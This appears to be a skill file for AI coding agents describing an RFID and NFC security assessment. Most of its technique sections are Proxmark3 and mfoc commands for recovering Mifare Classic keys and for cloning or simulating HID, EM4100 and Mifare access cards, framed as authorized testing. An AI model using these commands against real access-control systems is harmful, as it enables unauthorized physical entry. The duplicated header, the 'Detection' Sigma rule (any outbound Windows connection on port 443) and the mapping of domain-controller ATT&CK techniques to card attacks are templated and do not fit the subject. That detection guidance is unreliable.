---
name: performing-rfid-security-assessment
description: <!-- Copyright (c) 2026 defconxt. All rights reserved. -->
---

<!-- Copyright (c) 2026 defconxt. All rights reserved. -->
<!-- Licensed under AGPL-3.0 — see LICENSE file for details. -->
---
name: performing-rfid-security-assessment
description: >-
  RFID and NFC security assessment including proximity card cloning, replay attacks, UID brute forcing, Mifare Classic key recovery, and physical access control bypass testing.
domain: cybersecurity
subdomain: wireless-security
tags:
  - rfid
  - nfc
  - proxmark
  - mifare
  - access-control
version: "1.0"
author: defconxt
license: AGPL-3.0
compatibility: Designed for Claude Code, GitHub Copilot, OpenAI Codex, Cursor, Gemini CLI, and any agentskills.io-compatible agent.
metadata:
  mitre-attack: ["T1200", "T1556.001", "T1078"]
  nist-csf: ["PR.AC-1", "PR.AC-7", "DE.CM-1"]
  uuid: 058d38e3-19a7-48b7-a86c-e5b1d3e4d36e
---

# Performing RFID Security Assessment

## Overview

RFID security assessments evaluate the security of proximity-based access systems
including HID, Mifare, EM4100, and NFC-based credentials. Using tools like Proxmark3 and
libnfc, testers can clone credentials, perform replay attacks, recover encryption keys, and
validate physical access control implementations. All testing requires explicit written
authorization from the facility owner.

Mode: `[MODE: RED]` for this technique.

## Prerequisites

| Requirement | Details |
|---|---|
| Proxmark3 RDV4 or compatible RFID research device | Required |
| libnfc and nfc-tools for NFC interaction | Required |
| mfoc and mfcuk for Mifare Classic key recovery | Required |
| Physical access to target RFID readers | Required |
| Written authorization / Rules of Engagement | Required |

## Key Concepts

### RFID Attack Surface

```
RFID Security Assessment Phases:
├── Credential Analysis
│   ├── Card technology identification (LF/HF)
│   ├── UID/CSN extraction
│   ├── Sector data dump and analysis
│   └── Encryption key recovery
├── Cloning Attacks
│   ├── UID-only cloning (T5577, Magic Mifare)
│   ├── Full sector cloning with keys
│   ├── HID proximity card duplication
│   └── EM4100 LF credential cloning
├── Protocol Attacks
│   ├── Mifare Classic nested authentication
│   ├── Mifare Classic darkside attack
│   ├── Replay attacks against readers
│   └── Brute force UID enumeration
└── Physical Assessment
    ├── Reader placement evaluation
    ├── Tailgating gap analysis
    ├── Long-range read testing
    └── Shielding effectiveness
```

### Card Identification and UID Extraction

```bash
# Auto-detect card technology with Proxmark3
proxmark3 /dev/ttyACM0
[proxmark3]> auto
[proxmark3]> hf search
[proxmark3]> lf search

# Read HID Prox credentials
[proxmark3]> lf hid read

# Read Mifare Classic UID and ATQA/SAK
[proxmark3]> hf mf info

# Dump Mifare Classic with known default keys
[proxmark3]> hf mf autopwn
```

### Mifare Classic Key Recovery

```bash
# Darkside attack — recover first key from vulnerable cards
[proxmark3]> hf mf darkside

# Nested authentication attack — recover remaining keys
[proxmark3]> hf mf nested --blk 0 -a -k FFFFFFFFFFFF --tblk 4

# Hard-nested attack for hardened cards
[proxmark3]> hf mf hardnested --blk 0 -a -k FFFFFFFFFFFF --tblk 4

# Full dump with recovered keys
[proxmark3]> hf mf dump

# Alternative: mfoc for automated key recovery
mfoc -O card_dump.mfd
```

### Credential Cloning

```bash
# Clone HID credential to T5577 card
[proxmark3]> lf hid read
[proxmark3]> lf hid clone --raw 200670012d

# Clone Mifare Classic to Magic card (Gen1a)
[proxmark3]> hf mf cload -f card_dump.mfd

# Write EM4100 ID to T5577 blank
[proxmark3]> lf em 410x clone --id 0102030405

# Simulate card UID for access testing
[proxmark3]> hf mf sim --uid 01020304
```

## Workflow

### Step 1: Pre-Engagement

Confirm scope includes physical access control testing and obtain facility authorization.

### Step 2: Card Technology Identification

```bash
[proxmark3]> auto
[proxmark3]> hf search
[proxmark3]> lf search
```

### Step 3: Key Recovery

Execute appropriate key recovery attacks for the identified card technology.

### Step 4: Cloning Validation

```bash
# Test cloned credential against authorized reader
# Document successful and failed access attempts
```

### Step 5: Reporting

Document findings including clone success rate, reader vulnerabilities, and remediation.

## Detection

```yaml
title: Rfid Security Assessment Detection
id: 94219142-b970-42a1-a7c7-144c19b68e83
status: experimental
description: Detects suspicious activity related to performing rfid security assessment techniques in wireless security context
logsource:
  category: network_connection
  product: windows
detection:
  selection:
    DestinationPort: 443
    Initiated: "true"
  condition: selection
level: medium
tags:
  - attack.t1200
  - attack.t1556.001
  - attack.t1078
  - attack.initial_access
falsepositives:
  - Wireless intrusion detection system performing routine monitoring
```


**Detection Opportunities**

| Indicator | Source | Detection Logic |
|---|---|---|
| Rfid Security Assessment Detection | windows/network_connection | Sigma rule (medium) |
| ATT&CK Coverage | MITRE ATT&CK | T1200, T1556.001, T1078 |

## Verification

- [ ] Card technology correctly identified for all tested credentials
- [ ] Key recovery attempted and results documented
- [ ] Cloning tested only against authorized readers
- [ ] Physical access control gaps documented with photos
- [ ] Remediation recommendations include both technical and procedural controls

## References

- MITRE ATT&CK T1200 — Hardware Additions
- MITRE ATT&CK T1556.001 — Domain Controller Authentication
- OWASP IoT Security Testing Guide
- [Proxmark3 documentation](https://github.com/RfidResearchGroup/proxmark3)
